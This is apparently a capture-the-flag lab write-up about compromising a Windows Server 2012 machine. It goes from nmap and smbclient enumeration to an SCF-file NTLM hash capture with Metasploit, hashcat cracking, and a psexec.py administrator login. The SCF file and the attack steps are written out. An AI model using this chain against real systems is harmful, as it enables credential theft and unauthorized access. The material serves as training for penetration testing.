## First machine

We started by scanning the IP using `nmap`:

        nmap -A [IP] -Pn

nmap results:

    PORT      STATE SERVICE            VERSION
    135/tcp   open  msrpc              Microsoft Windows RPC
    139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server?
    | rdp-ntlm-info:
    |   Target_Name: WIN-8EHFSR9B2UL
    |   NetBIOS_Domain_Name: WIN-8EHFSR9B2UL
    |   NetBIOS_Computer_Name: WIN-8EHFSR9B2UL
    |   DNS_Domain_Name: WIN-8EHFSR9B2UL
    |   DNS_Computer_Name: WIN-8EHFSR9B2UL
    |   Product_Version: 6.3.9600
    |_  System_Time: 2023-01-02T12:28:36+00:00
    |_ssl-date: 2023-01-02T12:29:16+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=WIN-8EHFSR9B2UL
    | Not valid before: 2023-01-01T12:23:44
    |_Not valid after:  2023-07-03T12:23:44
    49154/tcp open  msrpc              Microsoft Windows RPC
    49155/tcp open  msrpc              Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_nbstat: NetBIOS name: WIN-8EHFSR9B2UL, NetBIOS user: <unknown>, NetBIOS MAC: 06:8e:e9:37:d4:20 (unknown)
    | smb-os-discovery:
    |   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
    |   OS CPE: cpe:/o:microsoft:windows_server_2012::-
    |   Computer name: WIN-8EHFSR9B2UL
    |   NetBIOS computer name: WIN-8EHFSR9B2UL\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2023-01-02T12:28:36+00:00
    | smb2-time:
    |   date: 2023-01-02T12:28:36
    |_  start_date: 2023-01-02T12:22:22
    | smb2-security-mode:
    |   3.0.2:
    |_    Message signing enabled but not required

after that we used `smbclient` to list the shares in the machine:

    smbclient -L [IP]

smbclient results:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        compta          Disk      windows lab
        deepwin         Disk      windows lab
        IPC$            IPC       Remote IPC
        orga            Disk      windows lab
        print$          Disk      Printer Drivers

We then tried to connect to the `compta` share:

    smbclient \\\\[IP]\\compta

we found a file called `file_backup.zip` and we downloaded it using `get` command.

We then used `unzip` to extract the file:

    unzip file_backup.zip

we found a file called `file.scf` and we opened it using `cat` command:

    [shell]
    command=2
    IconFile=\\172.31.31.144\\compta\\hacked.ico
    [taskbar]
    Command=ToogleDesktop

`An SCF file is a shortcut file that can be used to perform a specific action or set of actions in Windows.`

after a bit of research we found that we can use `scf` files to do an smb relay attack.

first thing we need to change the ip in the file to our ip so that the victim machine will connect to us because When a user clicks on an SCF file that references a network share, Windows will attempt to establish a connection to the share by authenticating with the username and password of the current user. As part of this process, the server will send a challenge key to the client, which the client uses to encrypt the user's password hash. This encrypted password hash, also known as the NTLM hash, can be captured by some tools like `Responder` and used to try to crack the user's password but i prefer to use `Metasploit` for this.

after that we need to put the file in `compta` share so that the victim machine can access it.

in `Metasploit` we can use `auxiliary/server/capture/smb` to set up a smb server and capture the NTLM hash.

after that we can use `hashcat` to crack the hash.

    hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt

hashcat result was `P@ssw0rd` and we can use it to login to the machine.

so we can easily login to the machine using `psexec.py`:

    psexec.py Administrator@[IP]

we found the flag in `C:\Users\Administrator\Desktop\proof.txt`.
